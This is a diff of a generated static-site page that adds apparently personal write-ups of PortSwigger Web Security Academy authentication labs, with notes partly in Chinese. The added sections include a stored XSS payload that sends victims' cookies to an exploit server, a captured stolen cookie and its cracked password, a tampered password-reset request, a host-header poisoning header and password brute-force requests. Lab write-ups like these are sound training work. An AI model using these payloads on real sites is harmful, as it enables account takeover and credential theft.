@@ -12,20 +12,20 @@
     <title>Lab Other Mechanisms :: My New Hugo Site</title>
 
     
-    <link href="/css/nucleus.css?1656907324" rel="stylesheet">
-    <link href="/css/fontawesome-all.min.css?1656907324" rel="stylesheet">
-    <link href="/css/hybrid.css?1656907324" rel="stylesheet">
-    <link href="/css/featherlight.min.css?1656907324" rel="stylesheet">
-    <link href="/css/perfect-scrollbar.min.css?1656907324" rel="stylesheet">
-    <link href="/css/auto-complete.css?1656907324" rel="stylesheet">
-    <link href="/css/atom-one-dark-reasonable.css?1656907324" rel="stylesheet">
-    <link href="/css/theme.css?1656907324" rel="stylesheet">
-    <link href="/css/tabs.css?1656907324" rel="stylesheet">
-    <link href="/css/hugo-theme.css?1656907324" rel="stylesheet">
+    <link href="/css/nucleus.css?1656925569" rel="stylesheet">
+    <link href="/css/fontawesome-all.min.css?1656925569" rel="stylesheet">
+    <link href="/css/hybrid.css?1656925569" rel="stylesheet">
+    <link href="/css/featherlight.min.css?1656925569" rel="stylesheet">
+    <link href="/css/perfect-scrollbar.min.css?1656925569" rel="stylesheet">
+    <link href="/css/auto-complete.css?1656925569" rel="stylesheet">
+    <link href="/css/atom-one-dark-reasonable.css?1656925569" rel="stylesheet">
+    <link href="/css/theme.css?1656925569" rel="stylesheet">
+    <link href="/css/tabs.css?1656925569" rel="stylesheet">
+    <link href="/css/hugo-theme.css?1656925569" rel="stylesheet">
     
     
 
-    <script src="/js/jquery-3.3.1.min.js?1656907324"></script>
+    <script src="/js/jquery-3.3.1.min.js?1656925569"></script>
 
     <style>
       :root #header + #content > #left > #rlblock_left{
@@ -135,14 +135,14 @@
     <span data-search-clear=""><i class="fas fa-times"></i></span>
 </div>
 
-<script type="text/javascript" src="/js/lunr.min.js?1656907324"></script>
-<script type="text/javascript" src="/js/auto-complete.js?1656907324"></script>
+<script type="text/javascript" src="/js/lunr.min.js?1656925569"></script>
+<script type="text/javascript" src="/js/auto-complete.js?1656925569"></script>
 <script type="text/javascript">
     
         var baseurl = "https:\/\/fr33rh.github.io\/";
     
 </script>
-<script type="text/javascript" src="/js/search.js?1656907324"></script>
+<script type="text/javascript" src="/js/search.js?1656925569"></script>
 
     
   </div>
@@ -447,6 +447,10 @@
 <nav id="TableOfContents">
   <ul>
     <li><a href="#lab-brute-forcing-a-stay-logged-in-cookie">Lab: Brute-forcing a stay-logged-in cookie</a></li>
+    <li><a href="#lab-offline-password-cracking">Lab: Offline password cracking</a></li>
+    <li><a href="#lab-password-reset-broken-logic">Lab: Password reset broken logic</a></li>
+    <li><a href="#lab-password-reset-poisoning-via-middleware">Lab: Password reset poisoning via middleware</a></li>
+    <li><a href="#lab-password-brute-force-via-password-change">Lab: Password brute-force via password change</a></li>
   </ul>
 </nav>
     </div>
@@ -484,7 +488,34 @@ Add prefix: carlos:
 Encode: Base64-encode
 </code></pre>
 <p>As the Update email button is only displayed when you access the /my-account page in an authenticated state, we can use the presence or absence of this button to determine whether we&rsquo;ve successfully brute-forced the cookie. On the Options tab, add a grep match rule to flag any responses containing the string Update email. Start the attack.</p>
-
+<h2 id="lab-offline-password-cracking">Lab: Offline password cracking</h2>
+<ul>
+<li>Your credentials: wiener:peter</li>
+<li>Victim&rsquo;s username: carlos</li>
+<li>贴心的提供了xss服务器exploit server</li>
+</ul>
+<p>Go to one of the blogs and post a comment containing the following stored XSS payload, remembering to enter your own exploit server ID:</p>
+<pre tabindex="0"><code>&lt;script&gt;document.location=&#39;//exploit-XXXXX.web-security-academy.net/&#39;+document.cookie&lt;/script&gt;
+</code></pre><p>在log里发现</p>
+<pre tabindex="0"><code>10.0.1.221      2022-07-04 07:15:58 +0000 &#34;GET /secret=Z624gql0H30Vxh0ItRUVqjRshMd4KGuT;%20stay-logged-in=Y2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz HTTP/1.1&#34; 404 &#34;User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Safari/537.36&#34;
+</code></pre><p>解开是carlos:26323c16d5f4dabff3bb136f2460a943<br>
+在https://md5hashing.net/hash/md5/26323c16d5f4dabff3bb136f2460a943 获得明文onceuponatime</p>
+<h2 id="lab-password-reset-broken-logic">Lab: Password reset broken logic</h2>
+<p>重制wiener的密码，拦截请求，修改用户名即可</p>
+<pre tabindex="0"><code>temp-forgot-password-token=sPOfETbWOq9MGJq6gjk3sw4JEvpKDg2L&amp;username=carlos&amp;new-password-1=123456&amp;new-password-2=123456
+</code></pre><h2 id="lab-password-reset-poisoning-via-middleware">Lab: Password reset poisoning via middleware</h2>
+<p>学习Password reset poisoning<br>
+<a href="https://portswigger.net/web-security/host-header/exploiting/password-reset-poisoning">https://portswigger.net/web-security/host-header/exploiting/password-reset-poisoning</a></p>
+<p>推荐插件<code>Param Miner</code><br>
+<a href="https://github.com/PortSwigger/param-miner">https://github.com/PortSwigger/param-miner</a><br>
+<a href="https://portswigger.net/bappstore/17d2949a985c4b7ca092728dba871943">https://portswigger.net/bappstore/17d2949a985c4b7ca092728dba871943</a><br>
+<a href="https://portswigger.net/blog/practical-web-cache-poisoning">https://portswigger.net/blog/practical-web-cache-poisoning</a></p>
+<p>拦截重置密码的请求,修改用户名，添加header</p>
+<pre tabindex="0"><code>X-Forwarded-Host: exploit-XXXXX.web-security-academy.net
+</code></pre><h2 id="lab-password-brute-force-via-password-change">Lab: Password brute-force via password change</h2>
+<p>替换用户名,利用重置密码爆破</p>
+<pre tabindex="0"><code>username=carlos&amp;current-password=12345678&amp;new-password-1=123456&amp;new-password-2=1234
+</code></pre>
 
 <footer class="footline">
 	
@@ -692,19 +723,19 @@ Encode: Base64-encode
     <div style="left: -1000px; overflow: scroll; position: absolute; top: -1000px; border: none; box-sizing: content-box; height: 200px; margin: 0px; padding: 0px; width: 200px;">
       <div style="border: none; box-sizing: content-box; height: 200px; margin: 0px; padding: 0px; width: 200px;"></div>
     </div>
-    <script src="/js/clipboard.min.js?1656907324"></script>
-    <script src="/js/perfect-scrollbar.min.js?1656907324"></script>
-    <script src="/js/perfect-scrollbar.jquery.min.js?1656907324"></script>
-    <script src="/js/jquery.sticky.js?1656907324"></script>
-    <script src="/js/featherlight.min.js?1656907324"></script>
-    <script src="/js/highlight.pack.js?1656907324"></script>
+    <script src="/js/clipboard.min.js?1656925569"></script>
+    <script src="/js/perfect-scrollbar.min.js?1656925569"></script>
+    <script src="/js/perfect-scrollbar.jquery.min.js?1656925569"></script>
+    <script src="/js/jquery.sticky.js?1656925569"></script>
+    <script src="/js/featherlight.min.js?1656925569"></script>
+    <script src="/js/highlight.pack.js?1656925569"></script>
     <script>hljs.initHighlightingOnLoad();</script>
-    <script src="/js/modernizr.custom-3.6.0.js?1656907324"></script>
-    <script src="/js/learn.js?1656907324"></script>
-    <script src="/js/hugo-learn.js?1656907324"></script>
+    <script src="/js/modernizr.custom-3.6.0.js?1656925569"></script>
+    <script src="/js/learn.js?1656925569"></script>
+    <script src="/js/hugo-learn.js?1656925569"></script>
     
         
-            <script src="/mermaid/mermaid.js?1656907324"></script>
+            <script src="/mermaid/mermaid.js?1656925569"></script>
         
         <script>
             mermaid.initialize({ startOnLoad: true });
